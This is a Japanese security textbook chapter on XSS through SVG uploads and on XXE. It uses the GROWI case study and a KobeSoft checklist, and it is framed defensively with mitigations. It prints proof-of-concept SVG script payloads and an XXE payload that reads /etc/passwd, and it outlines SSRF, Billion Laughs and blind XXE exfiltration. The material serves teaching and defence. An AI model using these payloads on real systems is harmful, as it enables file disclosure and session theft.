これまでの章では、XMLを直接受け付けるAPIエンドポイントを主な対象としてXXE（XML External Entity、XML外部エンティティ）攻撃を扱ってきた。しかし実務のバグバウンティやセキュリティ診断で頻繁に遭遇する攻撃経路は、「XMLパーサーを直接叩くAPI」よりもむしろ「ファイルアップロード機能」である。SVGはXML方言の一つであり、DOCX/XLSX/PPTXなどのOffice系帳票ファイルもZIP圧縮されたXMLの集合体である。つまり「画像アップロード」「帳票アップロード」という一見無害に見える機能の裏側では、多くの場合XMLパーサーが動いており、そこにXXEやXSSの攻撃面が潜んでいる。本節では、日本語圏で実際に報告されたSVGアップロード経由のXSS事例と、XXE全般のチェックリストを取り上げ、「なぜ画像アップロードがコード実行につながるのか」という仕組みを掘り下げる。

### SVGはなぜ「画像」ではなく「コード」なのか

まず前提として、SVG（Scalable Vector Graphics）はPNGやJPEGのようなラスター画像フォーマットとは根本的に異なる。PNG/JPEGはピクセルデータのバイナリ表現であり、パーサーがそのバイナリを解釈して画面に描画するだけで、そこに「実行可能なロジック」が入り込む余地は（バッファオーバーフロー等の実装バグを除けば）基本的にない。

一方SVGは、XMLというテキストベースのマークアップ言語で図形を記述するフォーマットである。XMLである以上、`<script>`要素や`onload`などのイベントハンドラ属性を埋め込むことができ、これらはHTMLとほぼ同じ意味論でブラウザに解釈される。つまりSVGファイルは「画像の皮を被ったHTML/JavaScriptコンテナ」になり得る。これが「画像アップロード機能」が実は「任意HTML/JSアップロード機能」に変貌してしまう根本原因である。

具体的にSVGにスクリプトを仕込む最小例は次の通りである（防御目的の学習用サンプルであり、実在サービスへの無許可検証は行わないこと）。

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40" />
</svg>
```

あるいは`<script>`要素を直接埋め込む方法もある。

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

これらのファイルはSVGとして構文的に妥当（well-formed）であり、拡張子も`.svg`、MIMEタイプも`image/svg+xml`として扱われ得るため、サーバー側の「画像かどうか」の検査（拡張子チェックやMIMEタイプチェックのみ）を容易にすり抜ける。

### WESEEK社の事例に見る「表示経路」による挙動差

日本語圏の実例として、社内Wikiツール「GROWI」を開発するWESEEK社が公開している技術ブログ記事「SVGを利用したXSS」は、SVGアップロード経由のXSSがどのような条件で成立し、どのような条件では成立しないかを具体的に整理している。

記事の核心は、**SVGファイルの「表示のさせ方」によってスクリプトが実行されるかどうかが変わる**という点にある。記事は次のように述べている。

> 「img タグで表示する場合、SVGは画像として処理されるため、埋め込まれたスクリプトは実行されません」

これは、HTML側で`<img src="foo.svg">`のようにSVGを画像コンテキストとして埋め込んだ場合、ブラウザはSVGを「ラスタライズして描画するだけのリソース」として扱い、内部のスクリプトを実行するJavaScript実行コンテキストを与えないためである。仕組みとしては、`<img>`要素が生成する描画コンテキストはHTML文書のDOM（Document Object Model、ブラウザがHTML/XMLを解析して構築するツリー構造のオブジェクト群）とは分離されており、スクリプト実行エンジンとのブリッジが存在しない。

一方で記事は、次のように続ける。

> 「SVG をブラウザに直接表示することが可能な場合、埋め込まれたJavaScriptが実行されます」

つまり、`<img>`タグ経由ではなく、SVGファイルのURLへブラウザが直接ナビゲートした場合（アドレスバーに直接URLを入力した場合や、`window.location`で遷移した場合、あるいは`<a>`タグのリンク先として開いた場合など）、そのSVGはHTMLドキュメントと同様に「トップレベルのドキュメント」としてレンダリングされる。この場合ブラウザはSVGをHTML文書に準ずるものとして完全なDOM・スクリプト実行環境を構築するため、`onload`属性や`<script>`要素内のJavaScriptがそのオリジン（当該SVGが配信されているドメイン）の権限で実行されてしまう。

GROWIにおける具体的な脆弱性は次の通りである。

> 「添付ファイルのAttachmentIDを使用したURLで直接SVGにアクセスすると、埋め込まれたスクリプトが実行されてしまう」

すなわちGROWIでは、添付ファイル一覧などに掲載される「添付ファイル自体を指す直接URL」が存在し、そのURLへユーザーが遷移すると、SVGがトップレベルドキュメントとして開かれてしまっていた。ユーザーからすれば「添付データ一覧のリンクをクリックするだけ」という一見自然な操作が、攻撃者の埋め込んだスクリプトの実行トリガーになってしまう。

> 出典: SVGを利用したXSS — https://tips.weseek.co.jp/5fbe725836ac6300497c219e

#### 影響範囲の限定条件

記事はこの脆弱性の影響範囲についても明確に述べている。

> 「アップロードの権限を持たない外部のユーザーが脆弱性を利用して攻撃することはできません」

これは重要な指摘で、この種の「SVGアップロード型XSS」は**アップロード権限を持つユーザーが攻撃者になる（あるいは攻撃者が別の脆弱性を使ってアップロード権限を奪取する）ケース**に限定される、いわゆる「Stored XSS（格納型XSS。攻撃ペイロードがサーバー側に保存され、閲覧した第三者のブラウザ上で実行される種類のXSS）」の一種である。攻撃者自身がアップロードしたSVGを、管理者や他のユーザーが閲覧したときにスクリプトが実行される、という他者被害の構造を持つ。社内Wikiやチケット管理システム、CMSなど「登録ユーザーであれば誰でもファイルを添付できる」システムでは、アップロード権限のハードルが低いため、この限定条件があっても実質的な脅威度は高い。攻撃者は自分のアカウントでSVGをアップロードし、そのリンクを管理者に「見てください」とチャットやメールで送るだけで、管理者のセッションを乗っ取るCookie窃取やCSRFトークン窃取などにつなげられる。

#### 採用された対策：CSPによる防御

記事によれば、GROWIチームが採用した対策はContent Security Policy（CSP、ブラウザに対してどのリソース・スクリプトの実行を許可するかをHTTPレスポンスヘッダで宣言する仕組み）の活用である。

> 「CSPの`script-src`に`unsafe-hashes`を指定し、hash 値を一切指定していないため、全てのスクリプトを防ぐ」

やや技巧的な設定だが、仕組みを整理すると次のようになる。CSPの`script-src`ディレクティブは本来、許可するスクリプトのソースやハッシュ値をホワイトリスト形式で列挙する仕組みである。`unsafe-hashes`キーワードは、インラインのイベントハンドラ（`onclick`や`onload`属性など）を許可対象に含めるためのキーワードだが、通常はその後ろに許可したいスクリプトの具体的なSHA256ハッシュ値などを列挙する必要がある。GROWIの対策では、あえて有効なハッシュ値を一つも指定しないことで、「`unsafe-hashes`の仕組み自体は有効化しつつ、実際には一致するハッシュが存在しないため、あらゆるインラインイベントハンドラ由来のスクリプト実行を拒否する」という状態を作り出している。これにより、SVG内に`onload`属性でスクリプトが埋め込まれていても、ブラウザ側のCSP適用によって実行がブロックされる。

記事はさらに、次のように補足している。

> 「ユーザーが意図的にスクリプト実行を必要とする場合は、addEventListenerの使用が求められます」

これは、CSPによってインラインイベントハンドラ（HTML属性としての`onclick="..."`など）を一律禁止しても、JavaScriptコード側から`element.addEventListener('click', handler)`のように動的にイベントリスナーを登録する正規の実装は引き続き動作する、という設計思想を示している。CSPはあくまで「HTML属性に直接書かれた文字列としてのスクリプト」を狙い撃ちにブロックする仕組みであり、外部JSファイルや適切にnonce/hash管理されたスクリプトの正当な実行までは妨げない。

### SVGアップロード対策のベストプラクティス（本記事の知見を踏まえた整理）

上記の事例から導かれる、防御側が取るべき具体的な対策を整理すると以下の通りである。

1. **SVGをトップレベルドキュメントとして直接配信しない。** 添付ファイルURLへのアクセスに対しては、`Content-Disposition: attachment`ヘッダを付与して強制ダウンロードさせるか、あるいは画像変換パイプライン（SVGをラスター画像に変換して配信する）を経由させる。
2. **アップロードされたSVGをサニタイズする。** `<script>`要素、`on*`イベントハンドラ属性、`javascript:`スキームのURL、外部リソース参照（`<use>`要素によるリモートSVGの読み込みなど）を除去するサニタイザ（例: DOMPurifyのSVGプロファイル）を通す。
3. **配信元オリジンを分離する。** ユーザーアップロードコンテンツを、メインアプリケーションとは別ドメイン（Cookieレスなサブドメインなど）から配信し、仮にXSSが成立してもセッションCookieなどの重要情報にアクセスできないようにする。
4. **CSPを適用する。** 前述の通り、`script-src`を厳格に設定し、インラインスクリプトの実行を原則禁止する。
5. **拡張子・MIMEタイプ検査だけに頼らない。** SVGはXMLでありテキストとして中身を読めるため、アップロード時にサーバー側でファイル内容をパースし、危険な要素・属性の有無を検査する。

### XXEチェックリストとしてのKobeSoft記事

続いて、XXE全般の定義と対策チェックリストを提供するKobeSoft社の記事「XXEとは」を見ていく。この記事は本教科書のこれまでの章で扱ってきたXXEの基礎を、日本語で簡潔に再整理したものであり、特にSVGや帳票アップロード機能の点検観点として有用である。

記事はXXEを次のように定義する。

> 「XMLデータを処理するアプリケーションの脆弱性を突いた攻撃手法」

そして、攻撃の中心にあるのが「外部エンティティ」機能であると説明する。

> 「XMLには『エンティティ』という変数のような仕組みがあり、攻撃者は細工したXMLデータをサーバーに送信」することで、「本来アクセスできないはずのサーバー内ファイル（パスワード・設定ファイルなど）」の内容が読み取られる。

記事が提示する具体的なペイロードは、これまでの章で見てきたものと同型の基本形である。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInput>
  <name>&xxe;</name>
</userInput>
```

記事はこの動作原理を次のように説明する。

> この例では「`/etc/passwd`（Linuxのユーザー情報ファイル）の内容に置き換えられて処理される」

**仕組みレベルでの補足**：これは、XML 1.0仕様が定めるDTD（Document Type Definition、文書型定義。XML文書の構造やエンティティを宣言する部分）の中で、`SYSTEM`キーワードを使って外部リソース（ローカルファイルパスやURL）を指す一般エンティティを宣言できるためである。XMLパーサーは既定の設定では、文書中に現れる`&xxe;`のようなエンティティ参照を見つけると、DTDで宣言された置換テキスト（ここでは指定ファイルの中身）に置き換えてから構文解析を続行する。この「エンティティ展開」処理自体はXML規格が定める正当な機能であり、パーサーの実装バグではない。問題は、多くのアプリケーションが「ユーザー入力として受け取ったXMLに対して、外部エンティティの展開を許可したままパーサーを初期化している」という設定不備にある。

記事はさらに、XXEが引き起こす攻撃パターンを整理している。

- **ファイル読み取り**: サーバー内の認証情報盗取
- **SSRF（Server-Side Request Forgery、サーバーサイドリクエストフォージェリ。サーバーに攻撃者の意図した宛先へリクエストを送らせる攻撃）**: 内部ネットワークへの不正アクセス。`SYSTEM`の値を`file://`ではなく`http://internal-service/`のような内部URLにすることで、外部から到達不能な内部APIやクラウドメタデータエンドポイントへのリクエストをサーバーに代行させられる（本教科書のSSRF章も参照）。
- **Billion Laughs攻撃**: メモリ枯渇によるDoS（Denial of Service）。エンティティ参照が別のエンティティ参照をネストして数十億回展開されるように仕込むことで、パーサーのメモリを枯渇させてサービス停止に追い込む古典的な攻撃パターンである。
- **ブラインドXXE**: 外部サーバーへのデータ送信。レスポンスにファイル内容が直接反映されない場合でも、Out-of-Band（帯域外）のDNS/HTTPリクエストを介してデータを外部に持ち出す手法。

対策としては次が挙げられている。

> 1. 「FEATURE_EXTERNAL_GENERAL_ENTITIES」をfalseに設定
> 2. DOCTYPE宣言を含むXMLをフィルタリング
> 3. JSONへの移行

1点目はJavaのXMLパーサー（Xerces系実装）に代表される設定フラグの例で、外部一般エンティティの解決処理自体をパーサーレベルで無効化する対策である。多くの言語・ライブラリには同様の「安全なデフォルト設定」への切り替えオプションが用意されており、本教科書の各言語別対策の章で詳しく扱っている。2点目は、そもそも`<!DOCTYPE ...>`宣言を含む入力XMLを構文検査の前段で拒否するという、より単純で堅牢な防御である。DTD自体が不要なユースケース（多くのAPI連携やデータ交換）では、この方式が最も見通しが良い。3点目は、XMLという表現力の高いフォーマット自体を避け、エンティティ機構を持たないJSONへデータ交換フォーマットを置き換えるという、根本的なアーキテクチャ選択である。

> 出典: XXEとは — https://kobesoft.co.jp/mikata/words/security/xxe-xml-external-entity/

#### 帳票・SVGアップロード機能への適用チェックリスト

記事が示すチェックリストを、SVG/帳票アップロード機能の点検観点として本節向けに具体化すると次のようになる。

- **XMLを受け取るAPI・ファイル取込機能の確認**: SVGアップロード、DOCX/XLSX/PPTXなどのOffice文書アップロード、帳票テンプレート取込機能など、「XMLを内包するファイル形式」を受け付ける全エンドポイントを棚卸しする。ZIPアーカイブ形式のOffice文書は、展開すると内部に複数のXMLファイル（`document.xml`や`sharedStrings.xml`など）を含むため、アップロード処理のどこかでXMLパーサーが呼び出されている可能性が高い。
- **SVGや帳票アップロード機能でのXXE対策確認**: 各エンドポイントで使用しているXMLパーサーが、外部エンティティ解決・DTD処理を無効化した安全な設定で初期化されているかを個別に確認する。フレームワークやライブラリのバージョンアップで既定値が変わることもあるため、依存ライブラリのバージョンと既定設定は定期的に再確認する必要がある。
- **XMLパーサーのバージョン確認**: 古いバージョンのXMLパーサーでは、安全なデフォルト設定が後から導入された経緯を持つ実装が多い（例えば言語処理系やライブラリの特定バージョン以降でのみ既定で無効化されるケースがある）。導入しているパーサーのバージョンと、そのバージョンにおける既定の外部エンティティ処理挙動をセットで確認する。
- **脆弱性診断実施状況の確認**: SVG/帳票アップロード機能はUIやドキュメントに埋もれて見落とされがちな攻撃面であるため、通常のペネトレーションテストや脆弱性診断のスコープに明示的に含まれているかを確認する。

記事はまた、XXEの危険度についても言及している。

> 「OWASP Top 10 2017では『4位の独立カテゴリ』として記載され、★5つの最高危険度に分類される攻撃パターンが複数存在します」

**時事性についての補足**：OWASP Top 10は2017年版で「A4:2017-XML External Entities (XXE)」として独立カテゴリになったが、2021年版では「A05:2021-Security Misconfiguration」の一部としてXXEが統合され、独立カテゴリとしては扱われなくなっている点に注意が必要である。これはXXEという攻撃手法自体の脅威度が下がったからではなく、「安全でないXMLパーサー設定」という根本原因が、より広い「セキュリティ設定不備」カテゴリの一事例として再分類されたためである。攻撃面としての重要性は変わらないため、診断・監査の際にはOWASP Top 10のカテゴリ名だけに頼らず、XXE固有のチェック項目を個別に維持することが望ましい。

### 本節のまとめ

SVGアップロード機能は「画像アップロード」という見た目に反して、XMLパーサーとブラウザのスクリプト実行エンジンという二重の攻撃面を内包している。WESEEK社の事例が示す通り、同じSVGファイルでも`<img>`タグ経由での表示とブラウザへの直接ナビゲーションとでは実行コンテキストが根本的に異なり、後者の経路が塞がれていないと格納型XSSが成立する。防御としては、CSPによるスクリプト実行制御、配信オリジンの分離、Content-Dispositionによる強制ダウンロード化、そしてサーバー側でのSVGサニタイズを組み合わせる多層防御が有効である。

一方でXXEの観点からは、SVGやOffice帳票ファイルを受け付けるあらゆるアップロード機能が「隠れたXMLパーサー呼び出し箇所」であることを前提に棚卸しし、外部エンティティ解決の無効化・DOCTYPE宣言の拒否といった基本対策をエンドポイント単位で漏れなく適用することが、KobeSoft社のチェックリストが示す実務上の要諦である。次節以降では、これらの知見を踏まえ、具体的なOffice文書フォーマット（DOCX/XLSX等）経由のXXE悪用手法をさらに詳しく扱う。


---

[← 第3章 盲目XXE（Blind XXE / OOB XXE）](03-blind-xxe.md) ｜ [目次](index.md) ｜ [第5章 発展・フィルタ回避・関連攻撃 →](05-filter-bypass-related.md)
